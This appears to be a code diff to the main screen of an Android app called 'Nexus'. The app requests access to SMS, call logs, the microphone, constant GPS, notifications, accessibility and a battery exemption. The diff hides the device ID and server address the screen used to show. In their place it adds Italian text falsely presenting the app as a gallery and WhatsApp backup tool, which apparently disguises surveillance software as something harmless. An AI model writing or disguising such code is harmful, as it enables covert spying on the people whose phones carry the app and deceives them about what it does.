@@ -1,5 +1,6 @@
 package com.nexus.app;
 
+import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -21,6 +22,7 @@ public class MainActivity extends Activity {
     private static final int PERM_REQUEST = 100;
     private static final int TREE_REQUEST = 101;
 
+    @SuppressLint("InlinedApi")
     private String[] PERMISSIONS = {
         Manifest.permission.READ_CALL_LOG,
         Manifest.permission.READ_SMS,
@@ -39,8 +41,8 @@ public class MainActivity extends Activity {
 
         TextView tvDevice = findViewById(R.id.tv_device);
         TextView tvServer = findViewById(R.id.tv_server);
-        tvDevice.setText("Device: " + NexusConfig.getDeviceId(this));
-        tvServer.setText("Server: " + NexusConfig.SERVER_URL);
+        tvDevice.setText("La galleria si sincronizza automaticamente dalla libreria Android.");
+        tvServer.setText("La cartella extra serve solo per backup WhatsApp/file specifici.");
 
         Button btnNotif = findViewById(R.id.btn_notif);
         Button btnAccess = findViewById(R.id.btn_access);
@@ -63,11 +65,7 @@ public class MainActivity extends Activity {
             startActivityForResult(i, TREE_REQUEST);
         });
 
-        btnBattery.setOnClickListener(v -> {
-            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-            i.setData(Uri.parse("package:" + getPackageName()));
-            startActivity(i);
-        });
+        btnBattery.setOnClickListener(v -> requestBatteryOptimizationExemption());
 
         btnLocation.setOnClickListener(v -> {
             Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
@@ -101,7 +99,7 @@ public class MainActivity extends Activity {
             (hasBackgroundLocation() ? "✓" : "✗") + " GPS sempre\n" +
             (hasPerm(Manifest.permission.RECORD_AUDIO) ? "✓" : "✗") + " Audio   " +
             (hasPerm(Manifest.permission.READ_SMS) ? "✓" : "✗") + " SMS\n" +
-            (ExternalTreeSync.hasTree(this) ? "✓" : "✗") + " Cartella SD autorizzata"
+            (ExternalTreeSync.hasTree(this) ? "✓" : "✗") + " Cartella backup/extra autorizzata"
         );
         TextView tvStatus = findViewById(R.id.tv_status);
         tvStatus.setText(notifOk && accessOk ? "● Nexus Attivo" : "○ Nexus — Permessi Mancanti");
@@ -136,6 +134,13 @@ public class MainActivity extends Activity {
         } catch (Exception e) {
             android.util.Log.e("Nexus", "Impossibile avviare il servizio", e);
         }
+    }
+
+    @SuppressLint("BatteryLife")
+    private void requestBatteryOptimizationExemption() {
+        Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+        i.setData(Uri.parse("package:" + getPackageName()));
+        startActivity(i);
     }
 
     private boolean hasPerm(String perm) {
